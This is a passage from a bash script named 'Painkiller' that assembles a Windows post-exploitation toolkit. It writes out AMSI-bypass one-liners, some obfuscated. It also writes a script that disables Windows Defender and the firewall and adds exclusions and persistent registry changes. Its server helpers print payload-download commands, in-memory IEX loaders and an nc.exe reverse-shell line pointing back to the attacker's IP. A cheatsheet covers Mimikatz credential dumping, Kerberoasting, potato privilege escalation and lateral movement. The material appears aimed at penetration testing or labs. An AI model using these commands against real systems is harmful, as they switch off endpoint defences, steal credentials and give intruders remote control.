    Write-Host "`n[!] All bypasses failed. Try PowerShell v2:" -ForegroundColor Yellow
    Write-Host "    powershell -version 2 -ep bypass" -ForegroundColor Yellow
}

# Run automatically
Invoke-AMSIBypass
EOF

    # One-liners file
    cat > "${bypass}/oneliners.txt" << 'EOF'
# ═══════════════════════════════════════════════════════════════════════════
#                           BYPASS ONE-LINERS
# ═══════════════════════════════════════════════════════════════════════════

# ───────────────────────────────────────────────────────────────────────────
# AMSI BYPASSES (copy-paste ready)
# ───────────────────────────────────────────────────────────────────────────

# Option 1: Memory Patch
$a=[Ref].Assembly.GetTypes()|%{if($_.Name -like "*iUtils"){$_}};$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"};$b.SetValue($null,[IntPtr]::Zero)

# Option 2: String Obfuscation  
$w = 'System.Management.Automation.A]m]s]i]Utils'.Replace(']',''); $d = 'a]m]s]i]I]n]i]t]F]a]i]l]e]d'.Replace(']',''); [Ref].Assembly.GetType($w).GetField($d,'NonPublic,Static').SetValue($null,$true)

# Option 3: Char Array
$a=[char[]](0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64) -join '';$b=[char[]](0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4d,0x61,0x6e,0x61,0x67,0x65,0x6d,0x65,0x6e,0x74,0x2e,0x41,0x75,0x74,0x6f,0x6d,0x61,0x74,0x69,0x6f,0x6e,0x2e,0x41,0x6d,0x73,0x69,0x55,0x74,0x69,0x6c,0x73) -join '';[Ref].Assembly.GetType($b).GetField($a,'NonPublic,Static').SetValue($null,$true)

# Option 4: Fresh session with obfuscation
powershell -ep bypass -nop -c "$a=[char]97;$m=[char]109;$s=[char]115;$i=[char]105;$u='Utils';$f=$a+$m+$s+$i+'InitFailed';$t='System.Management.Automation.'+$a+$m+$s+$i+$u;[Ref].Assembly.GetType($t).GetField($f,'NonPublic,Static').SetValue(`$null,`$true)"

# Option 5: PowerShell v2 (No AMSI)
powershell -version 2 -ep bypass -file script.ps1

# ───────────────────────────────────────────────────────────────────────────
# DEFENDER DISABLE (Admin Required)
# ───────────────────────────────────────────────────────────────────────────

# Quick disable all
Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIntrusionPreventionSystem $true -MAPSReporting Disabled -SubmitSamplesConsent NeverSend

# Add exclusions
Set-MpPreference -ExclusionPath "C:\" -ExclusionExtension ".ps1",".exe",".dll",".bat"

# Disable firewall
netsh advfirewall set allprofiles state off

# Registry (persistent)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f

# ───────────────────────────────────────────────────────────────────────────
# EXECUTION POLICY BYPASS
# ───────────────────────────────────────────────────────────────────────────

Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
powershell -ep bypass -file script.ps1
powershell -exec bypass -c "IEX(gc script.ps1 -Raw)"

# ───────────────────────────────────────────────────────────────────────────
# CONSTRAINED LANGUAGE MODE BYPASS
# ───────────────────────────────────────────────────────────────────────────

# Check current mode
$ExecutionContext.SessionState.LanguageMode

# Bypass via PSv2
powershell -version 2

# ───────────────────────────────────────────────────────────────────────────
# APPLOCKER BYPASS PATHS
# ───────────────────────────────────────────────────────────────────────────

C:\Windows\Tasks\
C:\Windows\Temp\
C:\Windows\tracing\
C:\Windows\Registration\CRMLog\
C:\Windows\System32\FxsTmp\
C:\Windows\System32\com\dmp\
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys\
C:\Windows\System32\spool\PRINTERS\
C:\Windows\System32\spool\SERVERS\
C:\Windows\System32\spool\drivers\color\
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter\
C:\Windows\SysWOW64\FxsTmp\
C:\Windows\SysWOW64\com\dmp\
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter\
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System\

# ───────────────────────────────────────────────────────────────────────────
# TEST IF AMSI BYPASSED
# ───────────────────────────────────────────────────────────────────────────

'amsiutils'
# If it returns "amsiutils" without blocking, you're good!
EOF

    # Disable defender script
    cat > "${bypass}/disable-defender.ps1" << 'EOF'
# Disable Windows Defender (Requires Admin)

function Disable-Defender {
    param([switch]$Permanent)
    
    Write-Host "[*] Disabling Windows Defender..." -ForegroundColor Yellow
    
    # Disable real-time protection
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
        Set-MpPreference -MAPSReporting Disabled -ErrorAction SilentlyContinue
        Set-MpPreference -SubmitSamplesConsent NeverSend -ErrorAction SilentlyContinue
        Write-Host "[+] Real-time protection disabled" -ForegroundColor Green
    } catch {
        Write-Host "[-] Failed to disable real-time: $_" -ForegroundColor Red
    }
    
    # Add exclusions
    try {
        Set-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
        Set-MpPreference -ExclusionExtension ".ps1",".exe",".dll",".bat" -ErrorAction SilentlyContinue
        Write-Host "[+] Exclusions added" -ForegroundColor Green
    } catch {
        Write-Host "[-] Failed to add exclusions" -ForegroundColor Red
    }
    
    # Disable firewall
    try {
        netsh advfirewall set allprofiles state off 2>$null
        Write-Host "[+] Firewall disabled" -ForegroundColor Green
    } catch {
        Write-Host "[-] Failed to disable firewall" -ForegroundColor Red
    }
    
    if ($Permanent) {
        try {
            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f | Out-Null
            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f | Out-Null
            Write-Host "[+] Registry modifications applied (persistent)" -ForegroundColor Green
        } catch {
            Write-Host "[-] Registry modification failed" -ForegroundColor Red
        }
    }
    
    Write-Host "[*] Done!" -ForegroundColor Cyan
}

Write-Host "Run: Disable-Defender or Disable-Defender -Permanent" -ForegroundColor Cyan
EOF

    log "INFO" "Created bypass scripts"
}

create_server_scripts() {
    log "HEADER" "Creating Server Scripts"
    
    # HTTP Server
    cat > "${TOOLS_DIR}/serve-http.sh" << 'EOF'
#!/bin/bash
# Quick HTTP server

PORT="${1:-80}"
IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')

echo -e "\n\033[32m[+] Starting HTTP server\033[0m"
echo -e "\033[36mIP: ${IP}\033[0m"
echo -e "\033[36mPort: ${PORT}\033[0m"
echo ""
echo -e "\033[33m=== DOWNLOAD COMMANDS ===\033[0m"
echo ""
echo "# PowerShell:"
echo "iwr http://${IP}:${PORT}/FILE -OutFile C:\\Windows\\Temp\\FILE"
echo "(New-Object Net.WebClient).DownloadFile('http://${IP}:${PORT}/FILE','C:\\Windows\\Temp\\FILE')"
echo ""
echo "# CMD:"
echo "certutil -urlcache -f http://${IP}:${PORT}/FILE C:\\Windows\\Temp\\FILE"
echo ""
echo "# In-Memory (PowerShell):"
echo "IEX(New-Object Net.WebClient).DownloadString('http://${IP}:${PORT}/script.ps1')"
echo ""
echo -e "\033[33mPress Ctrl+C to stop\033[0m"
echo ""

python3 -m http.server ${PORT} 2>/dev/null || python -m SimpleHTTPServer ${PORT}
EOF
    chmod +x "${TOOLS_DIR}/serve-http.sh"

    # SMB Server
    cat > "${TOOLS_DIR}/serve-smb.sh" << 'EOF'
#!/bin/bash
# Quick SMB server

SHARE="${1:-tools}"
USER="${2:-}"
PASS="${3:-}"
IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')

echo -e "\n\033[32m[+] Starting SMB server\033[0m"
echo -e "\033[36mShare: \\\\${IP}\\${SHARE}\033[0m"
echo ""
echo -e "\033[33m=== ACCESS COMMANDS ===\033[0m"
echo ""
echo "# Direct copy:"
echo "copy \\\\${IP}\\${SHARE}\\FILE C:\\Windows\\Temp\\FILE"
echo ""
echo "# Execute directly:"
echo "\\\\${IP}\\${SHARE}\\nc.exe -e cmd.exe ${IP} 4444"
echo "\\\\${IP}\\${SHARE}\\mimikatz.exe"
echo ""
echo "# Mount as drive:"
echo "net use Z: \\\\${IP}\\${SHARE}"
echo ""

if [ -n "$USER" ] && [ -n "$PASS" ]; then
    echo -e "\033[36mAuth: ${USER}:${PASS}\033[0m"
    echo "net use Z: \\\\${IP}\\${SHARE} /user:${USER} ${PASS}"
    echo ""
    impacket-smbserver -smb2support -username "${USER}" -password "${PASS}" "${SHARE}" .
else
    echo -e "\033[36mNo auth (guest access)\033[0m"
    impacket-smbserver -smb2support "${SHARE}" .
fi
EOF
    chmod +x "${TOOLS_DIR}/serve-smb.sh"

    # FTP Server
    cat > "${TOOLS_DIR}/serve-ftp.sh" << 'EOF'
#!/bin/bash
# Quick FTP server

PORT="${1:-21}"
IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')

echo -e "\n\033[32m[+] Starting FTP server\033[0m"
echo -e "\033[36mIP: ${IP}:${PORT}\033[0m"
echo ""
echo -e "\033[33m=== FTP DOWNLOAD (on target) ===\033[0m"
cat << FTPEOF

# Create FTP script:
echo open ${IP} ${PORT} > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt  
echo binary >> ftp.txt
echo get FILE >> ftp.txt
echo bye >> ftp.txt

# Run:
ftp -s:ftp.txt

FTPEOF

python3 -m pyftpdlib -p ${PORT} -w 2>/dev/null || echo "Install: pip3 install pyftpdlib"
EOF
    chmod +x "${TOOLS_DIR}/serve-ftp.sh"

    log "INFO" "Created server scripts"
}

create_cheatsheet() {
    log "HEADER" "Creating Cheatsheet"
    
    cat > "${TOOLS_DIR}/cheatsheets/quick-ref.md" << 'EOF'
# 🎯 QUICK REFERENCE CHEATSHEET

## 📦 TOOL LOCATIONS
```
binaries/      - Standalone .exe files
powershell/    - .ps1 scripts
privesc/       - PrintSpoofer, GodPotato, winPEAS, etc.
credentials/   - Mimikatz, Rubeus, LaZagne, etc.
enumeration/   - Seatbelt, Snaffler, SharpView, etc.
bloodhound/    - SharpHound collectors
lateral/       - PsExec, nc.exe, RunasCs, etc.
tunneling/     - Chisel, Ligolo
bypass/        - AMSI bypasses, Defender disable
transfer/      - Transfer methods documentation
```

## 🚀 COMMON WORKFLOWS

### Initial Enumeration
```powershell
# Load PowerView
. .\PowerView.ps1
Get-Domain
Get-DomainUser | select name
Get-DomainComputer | select name
Get-DomainGroup | select name

# Or use Seatbelt
.\Seatbelt.exe -group=all
```

### Privilege Escalation
```powershell
# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# Or winPEAS
.\winPEAS.exe

# Potato attacks (if SeImpersonate)
.\GodPotato.exe -cmd "cmd /c whoami"
.\PrintSpoofer64.exe -c "cmd /c whoami"
```

### Credential Harvesting
```cmd
# Mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Rubeus - Kerberoasting
.\Rubeus.exe kerberoast /nowrap

# LaZagne
.\lazagne.exe all
```

### BloodHound Collection
```powershell
# PowerShell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Or executable
.\SharpHound.exe --CollectionMethods All
```

### Lateral Movement
```cmd
# PsExec
.\PsExec64.exe \\TARGET -u DOMAIN\USER -p PASS cmd.exe

# RunasCs
.\RunasCs.exe USER PASS "cmd.exe" -d DOMAIN
```

## 🔧 QUICK COMMANDS

### Start Services (on Kali)
```bash
./serve-http.sh 80      # HTTP server
./serve-smb.sh tools    # SMB server
./serve-ftp.sh 21       # FTP server
```

### Transfer to Target
```powershell
# HTTP
certutil -urlcache -f http://KALI/file.exe file.exe

# SMB
copy \\KALI\tools\file.exe C:\Windows\Temp\

# In-memory
IEX(New-Object Net.WebClient).DownloadString('http://KALI/script.ps1')
```

### AMSI Bypass + Load Script
```powershell
$a=[Ref].Assembly.GetTypes()|%{if($_.Name -like "*iUtils"){$_}};$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"};$b.SetValue($null,[IntPtr]::Zero);IEX(New-Object Net.WebClient).DownloadString('http://KALI/PowerView.ps1')
```
EOF

    log "INFO" "Created cheatsheet"
}

generate_inventory() {
    log "HEADER" "Generating Inventory"
    
    cat > "${TOOLS_DIR}/INVENTORY.md" << EOF
# 📦 PAINKILLER TOOLS INVENTORY

Generated: $(date)
Location: ${TOOLS_DIR}

## Directory Contents

\`\`\`
$(find "${TOOLS_DIR}" -type f \( -name "*.exe" -o -name "*.ps1" -o -name "*.bat" -o -name "*.sh" \) 2>/dev/null | sed "s|${TOOLS_DIR}/||g" | sort)
\`\`\`

## Tool Counts

- Windows Executables: $(find "${TOOLS_DIR}" -name "*.exe" 2>/dev/null | wc -l)
- PowerShell Scripts: $(find "${TOOLS_DIR}" -name "*.ps1" 2>/dev/null | wc -l)
- Batch Files: $(find "${TOOLS_DIR}" -name "*.bat" 2>/dev/null | wc -l)
- Shell Scripts: $(find "${TOOLS_DIR}" -name "*.sh" 2>/dev/null | wc -l)

## Quick Start

### HTTP Server
\`\`\`bash
cd ${TOOLS_DIR}
./serve-http.sh 80
\`\`\`

### SMB Server  
\`\`\`bash
cd ${TOOLS_DIR}
./serve-smb.sh tools
\`\`\`

### RDP with shared folder
\`\`\`bash
xfreerdp /v:TARGET /u:USER /p:PASS /drive:tools,${TOOLS_DIR}
\`\`\`

## See Also
- transfer/TRANSFER-METHODS.md - All transfer techniques
- bypass/oneliners.txt - AMSI & Defender bypasses
- cheatsheets/quick-ref.md - Quick reference
EOF

    log "INFO" "Generated INVENTORY.md"
}

cleanup() {
    log "HEADER" "Cleaning Up"
    
    rm -rf "${TEMP_DIR}" 2>/dev/null
    find "${TOOLS_DIR}" -type d -empty -delete 2>/dev/null
    chmod +x "${TOOLS_DIR}"/*.sh 2>/dev/null
    chmod +x "${TOOLS_DIR}"/tunneling/*linux* 2>/dev/null
    chmod +x "${TOOLS_DIR}"/binaries/*linux* 2>/dev/null
    
    log "INFO" "Cleanup complete"
}

print_summary() {
    local IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')
    
    echo ""
    echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                            DOWNLOAD COMPLETE!                                 ║${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}📁 Tools Directory:${NC} ${TOOLS_DIR}"
    echo -e "${CYAN}📡 Your IP:${NC} ${IP}"
    echo ""
    echo -e "${YELLOW}🚀 QUICK START:${NC}"
    echo ""
    echo -e "${BLUE}# HTTP Server:${NC}"
    echo "  cd ${TOOLS_DIR} && ./serve-http.sh 80"
    echo ""
    echo -e "${BLUE}# SMB Server:${NC}"
    echo "  cd ${TOOLS_DIR} && ./serve-smb.sh tools"
    echo ""
    echo -e "${BLUE}# RDP with folder share:${NC}"
    echo "  xfreerdp /v:TARGET /u:USER /p:PASS /drive:tools,${TOOLS_DIR}"
    echo ""
    echo -e "${YELLOW}📖 DOCUMENTATION:${NC}"
    echo "  ${TOOLS_DIR}/transfer/TRANSFER-METHODS.md  - All transfer methods"
    echo "  ${TOOLS_DIR}/bypass/oneliners.txt          - AMSI/Defender bypasses"
    echo "  ${TOOLS_DIR}/cheatsheets/quick-ref.md      - Quick reference"
    echo ""
    echo -e "${GREEN}✅ Ready to go!${NC}"
}

#=============================================================================
# MAIN
#=============================================================================

main() {
    banner
    
    log "INFO" "Starting Painkiller - Target: ${TOOLS_DIR}"
    
    check_dependencies
    create_directories
    download_powershell_scripts
    download_binaries
    copy_kali_tools
    clone_python_tools
    create_transfer_scripts
    create_bypass_scripts
    create_server_scripts
    create_cheatsheet
    generate_inventory
    cleanup
    
    print_summary
}

main "$@"
